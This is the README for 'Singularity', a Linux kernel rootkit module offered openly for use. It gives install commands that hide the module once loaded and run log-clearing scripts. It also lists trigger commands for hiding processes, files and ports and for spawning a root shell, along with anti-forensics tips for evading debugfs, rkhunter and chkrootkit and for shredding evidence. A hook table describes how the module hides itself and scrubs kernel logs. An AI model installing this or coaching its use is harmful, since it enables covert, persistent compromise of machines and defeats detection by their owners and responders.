# Singularity - Powerful Linux Kernel Rootkit

<img src="https://i.imgur.com/n3U5fsP.jpeg" alt="imgur" width="600"/>


> *"Shall we give forensics a little work?"*  


**Singularity** is a Linux Kernel Module (LKM) rootkit for modern kernels (6x).

Full detailed article: https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit

---

## Install

NOTE: There is no feature to make the module visible again, so once it is loaded, it will be hidden automatically and there is no way to remove it other than restarting the machine (if you have not enabled persistence after reboot).


```
cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity
make
sudo insmod singularity.ko
sudo bash scripts/journal.sh
sudo bash scripts/x.sh
cd ..
```

## Usage features

### Hiding process

To hide any process you can use `kill -59 PID`, and it will hide from `/proc/`, `ps`, `top`, and any process viewer, it will also be hidden from commands like `stat` and `ls`.

<p align="center">
<img src="https://i.imgur.com/wX2g459.png">
</p align="center">

### Hiding directory / files

To hide any directory or file, you can edit or view the file at `include/hiding_directory_def.h` and create a directory or file with its name, for example using `singularity`.

<p align="center">
<img src="https://i.imgur.com/a8eb6KS.png">
</p align="center">

### Become root

To become root, you can use the magic word, `MAGIC=mtz bash`, to spawn a bash with root.

<p align="center">
<img src="https://i.imgur.com/jCoi0LV.png">
</p align="center">

And you can use `kill -59 PID` too for become root.

### Hiding port

You can open a listening port 8081 and that port will be hidden for `ss`. `netstat`, `lsof` and `/proc/net/*` as well.

<p align="center">
<img src="https://i.imgur.com/WUuLu1q.png">
</p align="center">

> **Tested kernels: (**6.8.0-79-generic** and **6.12** only), other kernel versions may not compile or crash, precisely because it was designed for modern 6x kernels. This is a risk you can take, so use it in a VM. You can also modify the code to work on any kernel version you like.**  

## All credits

**Singularity** was created by me (**MatheuZSecurity**) with the goal of challenging myself to create an LKM Rootkit that is as undetectable as possible

- https://www.linkedin.com/in/mathsalves/

Join in **Rootkit Researchers** a community where there are only wizards and people who like rootkits, malware, red teaming, forensics and cyber security in general.

- https://discord.gg/66N5ZQppU7

There are codes that I originally reused from my "Collection of codes focused on Linux rootkits" repository, so 
**credits to the repo contributors as well.**

- https://github.com/MatheuZSecurity/Rootkit

---


## What Singularity *is*

Singularity, at a high level:

- Environment-triggered **privilege elevation** (signals/env markers).
- **Process hiding**: syscall-level filtering of `/proc` and process APIs.
- **Filesystem hiding**: directory listing and stat filtering by pattern.
- **Network stealth**: procfs-based `/proc/net/*` filtering and selective packet suppression.
- **Kernel log sanitization**: read-side filtering for `dmesg`/journal interfaces.
- **Module-hiding utilities**: sysfs & module-list tampering for reduced visibility.
- A background routine that **normalizes taint indicators** .


## More evasion tips

#### Debugfs

All current LKM rootkits, even open source ones, can be detected via `debugfs` on `/dev/sda3` (example) and this is certainly a problem for us.

1) To prevent any operations performed from being easily detected by forensic tools such as `debugfs`, it is recommended to create hidden files and directories in `/dev/shm`.

This directory is a partition mounted in RAM `(tmpfs)`, meaning it does not use the disk file system. For this reason, debugfs, which works directly with file systems such as ext4, cannot inspect the contents of `/dev/shm`.

2) Additionally, to ensure that files are actually destroyed on disk (if not in tmpfs), use the `shred` command.

Shred overwrites the data before deleting the file, minimizing the chance of recovery, including of inodes that may contain important metadata.

3) If you want to enable persistence after reboot with `load_and_persistence.sh`, **know that the kernel module will also be visible in debugfs and can be found**, so it's up to each person whether they want to use it, if you don't want to use it, just simply use the `make` command and load the module with `sudo insmod singularity.ko`

#### Standard tools

Singularity is able to easily bypass standard tools like **unhide, chkrootkit and rkhunter.**

#### Hidden file/directory

1) You can simply change the name of the hidden pattern in `include/hiding_directory_def.h`, because if posts appear teaching how to detect it by this, you can change the name to whatever you want.

2) You can also enable persistence after reboot, the name will be `singularity.conf`, but it is recommended that you change the name of the LKM/conf file, because if not a simple cat on the conf file in /etc/modules-load.d/ can reveal it to you

3) By default, with the directory name hidden, you cannot access it via `cd` command, it is useful when you need to copy some important file into the directory and then `cat singularity/shadow`, or simply copy a binary or something you want into the directory, and from there you use it without necessarily entering the directory

4) You can edit the filter in `modules/clear_taint_dmesg.c` as much as you want, you can add any log files you want or any file whose name you don't want to be visible (Be very careful with this, because depending on the word being filtered, it can break the system.)


---

## Hook map

This map shows the main hooks.

```

                            Rootkit Researchers
                         +-----------------------+
                         |   Userland Programs   |
                         | (shells, tools, apps) |
                         +-----------------------+
                                    |
                       Hooked syscalls & interfaces
                                    |
            +--------------------------------------------------+
            |                  ftrace hook core               |
            |   (centralized hook installer / fh_install)     |
            +--------------------------------------------------+
            /     |         |         |         |        |     \
           /      |         |         |         |        |      \
  +---------+ +-------+ +--------+ +--------+ +------+ +--------+ +------------+
  | getdents | | stat/ | | open/  | | read/  | | tcp/ | | write/ | | module     |
  | hooks    | | statx | | read-  | | read   | |proc/ | | hooks  | | hooks      |
  | (hiding  | | hooks | | link   | | hooks  | |hooks | |(ftrace| |(insmod /   |
  | _directory,| (_stat)| (_readlink)| (clear_) |(hiding)| control)| | hide_module)|
  | _getdents)| |      | | hooks  | | taint) | |      | |        | |            |
  +----+----+ +---+---+ +---+----+ +---+----+ +---+--+ +---+----+ +------+-----+
       |          |         |          |        |        |             |
       |          |         |          |        |        |             |
       |          |         |          |        |        |             |
  files/dirs   file meta   symlinks   kernel   /proc/net  debug/trace    module list
  (ls, find)   (stat/statx) (readlink) logs &  networking  interfaces    & sysfs
                                              dmesg/journal
                                            (taint masking, filtering)
```

---

## Hook reference

| Functions / Syscall | Module (file) | Short purpose |
|---|---:|---|
| `getdents` / `getdents64` | `modules/hiding_directory.c` | Filter directory entries by pattern & hide PIDs. |
| `stat` / `statx` | `modules/hiding_stat.c` | Alter file metadata returned to userland; adjust `nlink`. |
| `openat` / `readlinkat` | `modules/open.c`, `modules/hiding_readlink.c` | Return `ENOENT` for hidden paths / proc pids. |
| `chdir` | `modules/hiding_chdir.c` | Block navigation into hidden paths. |
| `read` (64/compat) | `modules/clear_taint_dmesg.c` | Filter kernel log reads (kmsg, journal) and remove tagged lines. |
| `/proc/net` seqfile exports | `modules/hiding_tcp.c` | Filter TCP/UDP entries to hide a configured port; drop packets selectively. |
| `write` syscalls | `modules/hooks_write.c` | Suppress writes to tracing controls like `ftrace_enabled`, `tracing_on`. |
| `init_module` / `finit_module` | `modules/hooking_insmod.c` | Block native module insert attempts / syscall paths for insmod (optional). |
| Module list / sysfs manipulation | `modules/hide_module.c` | Remove kobject entries and unlink module from list. |
| Kernel taint mask (kprobe) | `modules/reset_tainted.c` | Locate tainted_mask and periodically normalize it . |
| Credential manipulation | `modules/become_root.c` | Privilege escalation triggers. |
| Hook installer | `ftrace/ftrace_helper.c` | Abstraction used to install ftrace-based hooks across modules. |


---

## Plot

Unfortunately for some...

Even with all these filters, protections, and hooks, there are still ways to detect this rootkit. 

But if you're a good forensic, DFIR, or malware analyst, I'll let you figure it out on your own. 

I won't patch for this, because it will be much more OP ;)

---

## References for this research

KoviD: https://github.com/carloslack/KoviD
Basilisk: https://github.com/lil-skelly/basilisk

---
## Contribution and Bugs

Feel free to make pull requests and contribute to the project. Any errors with Singularity, please create an issue and report it to us.

Any bug found, if you want, open a issue or contact me via discord: `kprobe`

---

## Disclaimer

This code was developed solely for educational purposes, research, and controlled demonstrations of evasion techniques. Any use outside authorized environments, or for malicious purposes, is strictly prohibited and entirely the responsibility of the user. Unauthorized or illegal use may violate local, national, or international laws.


